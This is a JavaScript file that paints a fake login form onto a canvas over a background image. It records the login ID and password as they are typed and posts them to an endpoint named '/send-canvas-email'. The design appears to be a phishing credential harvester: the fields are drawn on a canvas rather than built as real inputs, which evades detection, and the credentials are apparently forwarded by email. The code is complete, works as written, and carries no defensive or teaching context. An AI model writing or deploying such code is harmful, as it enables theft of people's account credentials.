const canvas = document.getElementById("canvas");
const ctx = canvas.getContext("2d");

canvas.width = window.innerWidth;
canvas.height = window.innerHeight;

let loginID = "";
let password = "";
let activeField = null;

const bg = new Image();
bg.src = "background.jpg";

const inputBoxes = {
  login: { x: 40, y: 150, width: 640, height: 50 },
  pass: { x: 40, y: 265, width: 640, height: 50 },
  button: { x: 30, y: 390, width: 660, height: 60 }
};

bg.onload = () => draw();

function draw() {
  ctx.clearRect(0, 0, canvas.width, canvas.height);
  ctx.drawImage(bg, 0, 0, canvas.width, canvas.height);

  // Input fields
  ctx.strokeStyle = "gray";
  ctx.lineWidth = 2;
  ctx.font = "20px sans-serif";
  ctx.fillStyle = "black";

  Object.entries(inputBoxes).forEach(([key, box]) => {
    if (key !== "button") {
      ctx.strokeRect(box.x, box.y, box.width, box.height);
      const text = key === "login" ? loginID : "*".repeat(password.length);
      ctx.fillText(text, box.x + 10, box.y + 32);
    }
  });
}

canvas.addEventListener("click", (e) => {
  const x = e.offsetX;
  const y = e.offsetY;

  if (inBox(x, y, inputBoxes.login)) {
    activeField = "login";
  } else if (inBox(x, y, inputBoxes.pass)) {
    activeField = "pass";
  } else if (inBox(x, y, inputBoxes.button)) {
    sendData();
    loginID = "";
    password = "";
    activeField = null;
  } else {
    activeField = null;
  }
  draw();
});

function inBox(x, y, box) {
  return x > box.x && x < box.x + box.width && y > box.y && y < box.y + box.height;
}

window.addEventListener("keydown", (e) => {
  if (!activeField) return;

  if (e.key === "Backspace") {
    if (activeField === "login") loginID = loginID.slice(0, -1);
    else password = password.slice(0, -1);
  } else if (e.key.length === 1) {
    if (activeField === "login") loginID += e.key;
    else password += e.key;
  }
  draw();
});

function sendData() {
  fetch("/send-canvas-email", {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ loginID, password }),
  }).then((res) => res.json())
    .then((data) => alert(data.message || "Submitted"))
    .catch((err) => alert("Error sending"));
}
